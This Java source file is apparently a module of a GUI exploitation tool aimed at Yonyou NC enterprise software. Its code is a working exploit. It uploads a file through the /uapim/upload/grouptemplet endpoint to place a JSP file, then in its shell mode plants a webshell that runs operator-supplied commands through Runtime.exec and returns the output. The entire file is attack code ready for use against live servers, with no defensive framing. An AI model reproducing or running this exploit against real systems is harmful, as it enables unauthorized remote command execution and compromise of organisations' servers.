package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.Date;
import java.util.HashMap;

public class yongyou_nc_Grouptemplet_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attgetshell(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public String target_url(String url, String payload) {
        try {
            HttpTools post_res = new HttpTools();
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            HashMap<String, String> head = new HashMap();
            head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc");
            String data1 = "------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\""+filename+"\"\r\n" +
                    "Content-Type: application/octet-stream\r\n" +
                    "\r\n" +
                    payload
                    +"\r\n" +
                    "------WebKitFormBoundary6XgyjB6SeCArD3Hc--";
            Response post_resp = post_res.post(url+"/uapim/upload/grouptemplet?groupid=test",data1,head,"utf-8");
            Response post_resp1 = post_res.get(url+"/uapim/static/pages/test/head.jsp",new HashMap<>(),"utf-8");
            if ( post_resp1.getCode() == 200){
                return url + "/uapim/static/pages/test/head.jsp";
            }
        } catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {

            String payload = "Hello R4g";
            String result = target_url(url,payload);

            if (result!=null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_Grouptemplet_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n CMD处执行命令");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_Grouptemplet_upload-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }

    private boolean attgetshell(String url,String cmd,TextArea textArea,TextArea textArea_cmd){
        try {
            String shell_payload = "<%java.io.InputStream in = Runtime.getRuntime().exec(\""+cmd+"\").getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\");%>";
            long tt = (new Date()).getTime();
            String payload = tt+" \n" + shell_payload;
            String result = target_url(url,payload);

            Response get = HttpTools.get(result,new HashMap<>(),"utf-8");

            if ( result != null && get.getText().contains(tt+" ")) {

                Platform.runLater(() -> {
                    textArea.appendText("\n cmdjsp执行成功: ----"+tt);
                    textArea_cmd.appendText("\n"+get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }
}
